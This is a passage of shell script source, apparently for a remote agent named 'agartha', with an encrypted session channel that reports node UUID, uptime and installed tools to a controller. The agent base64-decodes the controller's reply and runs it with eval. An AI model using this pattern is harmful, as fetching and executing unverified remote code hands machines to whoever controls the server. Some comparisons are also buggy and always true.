 local askKey="$1"
 local found=""
 local shLogfunc="shCryptoChannelSessionSet($1)"
 [ "$shCryptoChannel" ] && shLog $shLog_TRACE "$shLogfunc askKey:$askKey" >&2
 if [ -z "$askKey" ] || [ ! "$askKey" -eq "$askKey" ];then
  [ "$shCryptoChannel" ] && shLog $shLog_ERROR "$shLogfunc:no sessionKey[$askKey]\n" >&2
 else
  local shCryptoChannelBuffer=""
  local newSession="$($cmdCat <&0 | $cmdBase64 | $cmdTr -d ' \n' )"
  for sessionKeyData in $(shPipeRead "$shCryptoChannelPipe" | $cmdTr -d '\n' | $cmdTr '|' '\n');do
   local sessionKey="$($cmdPrintf "$sessionKeyData" | $cmdCut -f1 -d':')"
   if [ "$sessionKey"="$askKey" ];then
    local shCryptoChannelBuffer="$shCryptoChannelBuffer|$askKey:$newSession"
    found="1"
   else
    local shCryptoChannelBuffer="$shCryptoChannelBuffer|$sessionKeyData"
   fi
  done
  if [ -z "$found" ];then
   [ "$shCryptoChannel" ] && shLog $shLog_WARNING "$shLogfunc:write new session key $askKey" >&2
   local shCryptoChannelBuffer="$askKey:$newSession|$shCryptoChannelBuffer"
  fi
  $cmdPrintf "$shCryptoChannelBuffer" | shPipeWrite $shCryptoChannelPipe
 fi
}
shCryptoChannelSessionGet() {
 local askKey="$1"
 local shLogfunc="shCryptoChannelSessionGet($1)"
 [ "$shCryptoChannel" ] && shLog $shLog_TRACE "$shLogfunc" >&2
 if [ -z "$askKey" ] || [ ! "$askKey" -eq "$askKey" ];then
  [ "$shCryptoChannel" ] && shLog $shLog_ERROR "$shLogfunc:no sessionKey[$askKey]\n" >&2
 else
  local shCryptoChannelBuffer="$(shPipeRead $shCryptoChannelPipe | $cmdTr -d '\n')"
  local notfound=""
  for sessionKeyData in $($cmdPrintf "$shCryptoChannelBuffer" | $cmdTr '|' '\n');do
   local sessionKey="$($cmdPrintf "$sessionKeyData" | $cmdCut -f1 -d':')"
   if [ "$sessionKey"="$askKey" ];then
    local notfound="1"
    $cmdPrintf "$sessionKeyData" | $cmdCut -f2- -d':' | $cmdBase64 -d | $cmdTr -d ' \n'
   fi
  done
  if [ -z "$notfound" ];then 
   [ "$shCryptoChannel" ] && shLog $shLog_ERROR "$shLogfunc:sessionKey[$askKey] not found\n" >&2
  fi
  $cmdPrintf "$shCryptoChannelBuffer" | shPipeWrite $shCryptoChannelPipe
 fi
}
shCryptoChannelWrite() {
 local sessionKey="$1"
 local shLogfunc="shCryptoChannelWrite($1)"
 [ "$shCryptoChannel" ] && shLog $shLog_TRACE "$shLogfunc" >&2
 local jsonSession="$(shCryptoChannelSessionGet $sessionKey)"
 local jsonResponse="$($cmdPrintf "$jsonSession" | jsonInObjectRead response64 | base64 -d -i)"
 local nextMessage64="$($cmdPrintf "$jsonSession" | jsonInObjectRead nextMessage64 )"
 [ "$shCryptoChannel" ] && shLog $shLog_INFO "$shLogfunc:jsonResponse\n$jsonResponse" >&2

 $cmdPrintf "$jsonSession" | jsonInObjectWrite "message64" "$nextMessage64" | shCryptoChannelSessionSet $sessionKey;
 
 local data64="$($cmdCat <&0 | $cmdBase64 | $cmdTr -d '\n' )";

 local message64="$($cmdPrintf "$nextMessage64" | $cmdBase64 -d -i | jsonInObjectWrite "data" "$data64" | $cmdBase64 | $cmdTr -d ' \n')";
 $cmdPrintf "$jsonResponse" | jsonInObjectWrite "data" "$message64" | shCryptEncode
}
shCryptoChannelRead() {
 local sessionKey="$1"
 local shLogfunc="shCryptoChannelRead($1)"
 [ "$shCryptoChannel" ] && shLog $shLog_TRACE "$shLogfunc" >&2

 if [ -z "$sessionKey" ] || [ ! "$sessionKey" -eq "$sessionKey" ];then
  [ "$shCryptoChannel" ] && shLog $shLog_ERROR "$shLogfunc: session key empty." >&2
 else
  local jsonSession="$(shCryptoChannelSessionGet $sessionKey)"
  if [ -z "$jsonSession" ];then 
   [ "$shCryptoChannel" ] && shLog $shLog_ERROR "$shLogfunc: session empty:\n$jsonSession" >&2
  else
   local ciphers="$($cmdPrintf "$jsonSession" | jsonInObjectRead $shCryptJsonCiphers)"
   local digests="$($cmdPrintf "$jsonSession" | jsonInObjectRead $shCryptJsonDigests)"
   [ "$shCryptoChannel" ] && shLog $shLog_INFO "$shLogfunc:ciphers\n$ciphers" >&2
   local jsonResponse="$($cmdCat <&0)"
   if [ -z "$jsonResponse" ];then 
    [ "$shCryptoChannel" ] && shLog $shLog_ERROR "$shLogfunc empty jsonResponse:$jsonResponse" >&2
   else
    $cmdPrintf "$jsonResponse" | jsonInObjectRead data
    [ "$shCryptoChannel" ] && shLog $shLog_TRACE "$shLogfunc write new nextMessage64 and record response64 in session" >&2
    $cmdPrintf "$jsonSession" |\
     jsonInObjectWrite response64 $($cmdPrintf "$jsonResponse" | $cmdBase64 | $cmdTr -d ' \n') |\
     jsonInObjectWrite nextMessage64 $(shCryptInitMessage "$ciphers" "$digests" | $cmdBase64 | $cmdTr -d ' \n') |\
     jsonInObjectWrite data $($cmdPrintf "$jsonResponse" | jsonInObjectRead data) |\
    shCryptoChannelSessionSet $sessionKey;
   fi
  fi
 fi
}
shCryptoChannelTry() {
 local sessionKey="$1"
 local shLogfunc="shCryptoChannelTry($1)"
 [ "$shCryptoChannel" ] && shLog $shLog_TRACE "$shLogfunc" >&2
 if [ -z "$sessionKey" ] || [ ! "$sessionKey" -eq "$sessionKey" ];then
  [ "$shCryptoChannel" ] && shLog $shLog_ERROR "$shLogfunc: session key empty." >&2
 else
 [ "$shCryptoChannel" ] && shLog $shLog_TRACE "$shLogfunc shCryptoChannelSessionGet" >&2
  local jsonSession="$(shCryptoChannelSessionGet $sessionKey)"
  if [ -z "$jsonSession" ];then 
   [ "$shCryptoChannel" ] && shLog $shLog_ERROR "$shLogfunc: session empty:\n$jsonSession" >&2
  else
   #[ "$shCryptoChannel" ] && shLog $shLog_TRACE "$shLogfunc:jsonSession\n$jsonSession" >&2
   local jsonMessage="$($cmdPrintf "$jsonSession" | jsonInObjectRead message64 | $cmdBase64 -d -i)"
   if [ -z "$jsonMessage" ];then 
    [ "$shCryptoChannel" ] && shLog $shLog_ERROR "$shLogfunc:no message in session:\n$jsonMessage" >&2
   else
    #[ "$shCryptoChannel" ] && shLog $shLog_TRACE "$shLogfunc:jsonMessage\n$jsonMessage" >&2
    #$cmdPrintf "$jsonMessage" | jsonInObjectWrite data $($cmdCat <&0) | shCryptDecode | $cmdBase64 -d -i | $cmdTr -d ' \n' | shCryptoChannelRead $sessionKey
    local dataCrypted="$($cmdCat <&0)"
    if [ -z "$dataCrypted" ];then
     [ "$shCryptoChannel" ] && shLog $shLog_ERROR "$shLogfunc:no data[$dataCrypted]\n" >&2
    else
     local jsonRead="$($cmdPrintf "$jsonMessage" | jsonInObjectWrite data $dataCrypted | shCryptDecode | $cmdBase64 -d -i | $cmdTr -d ' \n')"
     [ "$shCryptoChannel" ] && shLog $shLog_TRACE "$shLogfunc:decode\n$jsonRead" >&2
     if [ -z "$jsonRead" ];then
      [ "$shCryptoChannel" ] && shLog $shLog_ERROR "$shLogfunc:echec decode empty:\n$jsonRead" >&2
     else
      $cmdPrintf "$jsonRead" | shCryptoChannelRead $sessionKey
     fi
    fi
   fi
  fi
 fi
 #$cmdPrintf "coucou"
}

shCryptoChannelInitB() {
 local b64CryptoSession=""
 while read anData; do
  local b64CryptoSession="${anData}${b64CryptoSession}"
 done
# jsonCryptoSession=$($cmdPrintf "$b64CryptoSession" | $cmdBase64 -d -i 2>/dev/null);
 local jsonCryptoSession=$($cmdPrintf "$b64CryptoSession" | $cmdBase64 -d -i 2>/dev/null);
 $cmdPrintf "$jsonCryptoSession" | shCryptWritePipe $shCryptoChannelPipe
# $cmdPrintf "\\\n" | shCryptWritePipe $shCryptoChannelPipe
 $cmdPrintf "jsonCryptoSession $shCryptoChannelPipe ==================================================================================== $b64CryptoSession"
 $cmdPrintf "shCryptoChannelInitB:$jsonCryptoSession"
 $cmdPrintf "$jsonCryptoSession"
 $cmdPrintf "\\\n"
}
shCryptoChannelAsk() {
 local clearMessage=""
 while read anData; do
  local clearMessage="${anData}${b64CryptoSession}"
 done
 $cmdPrintf "ask : $clearMessage $shCryptoChannelPipe ===================================================================================="
 #
 jsonData="$(shCryptReadPipe $shCryptoChannelPipe)"
 $cmdPrintf "jsonData :\r\n$jsonData"
 $cmdPrintf "$jsonData" | json_sh -l
# local keySession="$(echo $jsonData | jsonInObjectRead keySession)"
# local firstMessage="$(echo $jsonData | jsonInObjectRead firstMessage)"
# local ciphers="$(echo $jsonData | jsonInObjectRead ciphers)"
 #keySession="$(shRandomizeASCCI 1000)"

}

#!/bin/sh
cmdList="cmdPrintf cmdTr cmdCat cmdTee"
#cmdList="$cmdList cmdRm cmdMktemp cmdMkfifo"
#cmdList="$cmdList cmdOpenssl"
#
shErrorOnMissing $cmdList

# shCryptoControllerRequest $controller
shCryptoControllerRequest() {
 local controller="$1"
 local shLogfunc="shCryptoControllerRequest $controller/$agarthaSessionKey"
 shLog $shLog_TRACE "$shLogfunc" >&2

 #shCryptoChannelWrite $agarthaSessionKey <&0 | httpRequest "$agarthaProto" "$agarthaHost" "$agarthaIpAddress" "$agarthaPort" "$controller" |\
 # $cmdTee /tmp/shCryptoControllerRequest.log | shCryptoChannelTry $agarthaSessionKey | $cmdTr -d ' \n'
 #
 
 local dataRequest="$( shCryptoChannelWrite $agarthaSessionKey <&0 )"
 $cmdPrintf "$dataRequest" | httpRequest "$agarthaProto" "$agarthaHost" "$agarthaIpAddress" "$agarthaPort" "$controller" |\
  $cmdTee /tmp/shCryptoControllerRequest.log | shCryptoChannelTry $agarthaSessionKey | $cmdTr -d ' \n'

# ( shCryptoChannelWrite $agarthaSessionKey <&0  ) | httpRequest "$agarthaProto" "$agarthaHost" "$agarthaIpAddress" "$agarthaPort" "$controller" |\
#  $cmdTee /tmp/shCryptoControllerRequest.log | shCryptoChannelTry $agarthaSessionKey | $cmdTr -d ' \n'
# (
#  local shCryptoControllerData=$($cmdCat <&0);
#  shLog $shLog_INFO "$shLogfunc receive( $($cmdPrintf $shCryptoControllerData | $cmdWc -c) )" >&2
#  $cmdPrintf $shCryptoControllerData | shCryptoChannelTry $agarthaSessionKey | $cmdTr -d ' \n'
# )
}

#!/bin/sh
cmdListFlux="cmdSh cmdEcho cmdPrintf cmdHead cmdTail cmdTr cmdCut cmdGrep cmdShuf cmdWc"
cmdOthers="cmdKill cmdSleep cmdDmidecode cmdWget cmdUptime"
cmdListEncode="cmdBase64 cmdMd5sum cmdOpenssl"
cmdListFile="cmdCp cmdRm cmdCat cmdMkfifo"
cmdListDirectory="cmdMkdir cmdMount cmdUmount cmdMktemp"
cmdListUserRight="cmdChmod cmdChown cmdChgrp cmdGroupadd cmdUseradd cmdChroot"

shErrorOnMissing $cmdListFlux $cmdOthers $cmdListEncode $cmdListFile $cmdListDirectory $cmdListUserRight

shAgentInit() {
 local shLogfunc="shAgentInit()"
 shLog $shLog_TRACE "$shLogfunc" >&2
 local dataEncrypted="$($cmdCat <&0)"
 
 if [ -z "$dataEncrypted" ] ;then
  shLog $shLog_ERROR "$shLogfunc: no data shAgentInit\n$dataEncrypted" >&2
 else
  local dataEncryptedSize="$($cmdPrintf ${dataEncrypted} | $cmdWc -c )"
  local jsonRequest="$(shPipeRead $jsonPipe 2>/dev/null)"
  local jsonRequestSize="$($cmdPrintf ${jsonRequest} | $cmdWc -c )"
  shLog $shLog_TRACE "$shLogfunc: jsonCrypted:$dataEncryptedSize jsonRequest:$jsonRequestSize" >&2
  local jsonInit="$($cmdPrintf "$jsonRequest" | jsonInObjectWrite data $dataEncrypted | shCryptDecode | $cmdBase64 -d -i )"
  shLog $shLog_TRACE "$shLogfunc: Read shAgentInit\n$jsonInit"
  agarthaHost="$($cmdPrintf $jsonInit	| jsonInObjectRead host)"
  agarthaIpAddress="$($cmdPrintf $jsonInit| jsonInObjectRead ipaddress)"
  agarthaPort="$($cmdPrintf $jsonInit	| jsonInObjectRead port)"
  agarthaProto="$($cmdPrintf $jsonInit| jsonInObjectRead proto)"
  agarthaSessionKey="$($cmdPrintf $jsonInit | shCryptoChannelInit)"
  shLog $shLog_TRACE "$shLogfunc: $agarthaProto://[$agarthaHost/$agarthaIpAddress]:$agarthaPort \n agarthaSessionKey:$agarthaSessionKey \n" >&2
 fi
}
agarthaIpAddress="";
agarthaPort="";
agarthaProto="";
agarthaHost="";

agarthaSessionKey="";

shAgentStart() {
 local shLogfunc="shAgentStart()"
 shLog $shLog_TRACE "$shLogfunc" >&2
 if [ -z "$agarthaSessionKey" ];then
  shAgentInit <&0
  local reponseJson=$($cmdPrintf "{}" | jsonInObjectWrite "nodeUUID" "$(shAgentGetNodeUUID 2>&1 | $cmdBase64 | $cmdTr -d '\n')" )
#  local reponseJson=$($cmdPrintf "$reponseJson" | jsonInObjectWrite "lz4" "" )
  local reponseJson=$($cmdPrintf "$reponseJson" | jsonInObjectWrite "lz4" "$(which lz4)" )
  local reponseJson=$($cmdPrintf "$reponseJson" | jsonInObjectWrite "php" "$(which php)" )
 else
  local reponseJson="{}"
 fi
 if [ -z "$agarthaSessionKey" ];then
  shLog $shLog_ERROR "$shLogfunc: empty session key" >&2
 else
  local shLogfunc="shAgentStart($agarthaSessionKey)"
  local reponseJson=$($cmdPrintf "$reponseJson" | jsonInObjectWrite "uptime" "$($cmdUptime | $cmdBase64 | $cmdTr -d '\n' )" )
  
  shLog $shLog_TRACE "$shLogfunc: Crypto Channel Response" >&2
  $cmdPrintf "$reponseJson" | shCryptoControllerRequest "ShInstall" | {
   local shLogfunc="$shLogfunc/handle()"
   shLog $shLog_TRACE "$shLogfunc: read" >&2;
   local receive="$($cmdCat <&0)";
   while read packet;do local receive="${receive}${packet}";shLog $shLog_DEBUG "$shLogfunc: packet:\n$packet" >&2;done
   if [ -z "$receive" ];then
    shLog $shLog_ERROR "$shLogfunc: reception empty:$receive" >&2;
   else
    shLog $shLog_TRACE "$shLogfunc: reception($($cmdPrintf $receive | $cmdWc -c ))" >&2;
    eval "$($cmdPrintf "$receive" | $cmdBase64 -d -i 2>/dev/null)";
   fi
  }
 fi
 shLog $shLog_TRACE "$shLogfunc: End" >&2
 #eval "$($cmdPrintf "$answer" )" 2>&1 & 
# local pid=$!
#$cmdPrintf "$cmdTrap "$cmdKill $pid 2>/dev/null" EXIT"
#$cmdTrap "$cmdKill $pid 2>/dev/null" EXIT
# local cpt=0
# while $cmdKill -0 $pid 2>/dev/null; do
#  $cmdPrintf "sleep 1 before show log,transfere is running:$cpt/$agarthaCpt\r"
#  $cmdSleep 1
#  local cpt=$(( cpt+1 )) ;
# done
}

$cmdPrintf "" | shAgentStart